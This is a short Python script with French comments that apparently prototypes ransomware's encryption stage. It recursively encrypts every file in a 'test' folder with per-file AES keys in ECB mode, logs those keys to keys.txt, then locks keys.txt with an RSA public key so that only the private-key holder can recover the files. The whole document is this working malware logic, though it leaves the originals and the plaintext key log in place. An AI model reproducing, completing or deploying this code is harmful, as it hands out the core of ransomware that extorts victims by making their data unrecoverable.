from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
import base64, os

CURDIR = os.path.dirname(os.path.realpath(__file__))

# Fonction pour chiffrer un fichier avec AES
def enc_file(file_path):
    # Générer une clé AES aléatoire
    aes_key = get_random_bytes(32)

    # Lire le contenu du fichier
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    # Ajouter du padding si nécessaire
    padding_length = 16 - (len(plaintext) % 16)
    plaintext += bytes([padding_length]) * padding_length

    # Chiffrer le contenu avec AES (mode ECB)
    cipher = AES.new(aes_key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)

    # Sauvegarder le fichier chiffré avec l'extension .enc
    enc_file_path = file_path + ".enc"
    with open(enc_file_path, 'wb') as f:
        f.write(ciphertext)

    # Ajouter la clé au fichier keys.txt
    with open(f"{CURDIR}/keys.txt", 'a') as key_file:
        key_file.write(f"{enc_file_path}:{base64.b64encode(aes_key).decode()}\n")

# Fonction pour parcourir un répertoire et chiffrer chaque fichier
def search_dir(directory):
    directory = f"{CURDIR}/{directory}"
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            enc_file(file_path)

    # Charger la clé publique
    with open(f"{CURDIR}/key.public", "rb") as f:
        public_key = RSA.import_key(f.read())

    # Lire le fichier keys.txt
    with open(f"{CURDIR}/keys.txt", 'rb') as f:
        keys_content = f.read()

    # Chiffrer keys.txt en plusieurs blocs compatibles avec RSA
    cipher_rsa = PKCS1_OAEP.new(public_key)

    chunk_size = 190  # Taille compatible avec RSA (2048 bits - padding overhead)
    encrypted_chunks = [cipher_rsa.encrypt(keys_content[i:i + chunk_size]) for i in range(0, len(keys_content), chunk_size)]

    # Sauvegarder le fichier chiffré
    with open(f"{CURDIR}/keys.txt.enc", 'wb') as f:
        for chunk in encrypted_chunks:
            f.write(chunk)

if __name__ == "__main__":
    search_dir("test")
    print("Chiffrement terminé.")
